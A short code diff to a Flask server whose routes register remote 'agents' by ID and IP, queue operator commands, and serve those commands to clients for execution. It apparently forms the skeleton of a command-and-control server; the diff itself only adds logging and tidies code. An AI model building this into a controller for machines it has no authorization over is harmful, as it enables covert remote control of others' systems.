@@ -21,8 +21,9 @@ def hello_world():
 
 @app.route("/register")
 def agent_id():
-    client_id = id_generator() 
+    client_id = id_generator()
     clients.append([client_id, request.remote_addr])
+    print(client_id, request.remote_addr + "has connected")
     return client_id
 
 
@@ -32,11 +33,6 @@ def list_clients():
         return clients
     else:
         return "no clients"
-
-
-# @app.route("/execute")
-# def execute_command():
-#     return commands[0]
 
 
 @app.route("/execute", methods=['POST'])
@@ -50,6 +46,7 @@ def execute_command():
     else:
         return "no commands found"
 
+
 @app.route("/add-command", methods=['POST'])
 def add_command():
     if request.method == 'POST':
@@ -58,6 +55,7 @@ def add_command():
         return "received command: " + request.form["command"]
     else:
         return "not a post request"
+
 
 @app.route("/show-commands")
 def show_commands():
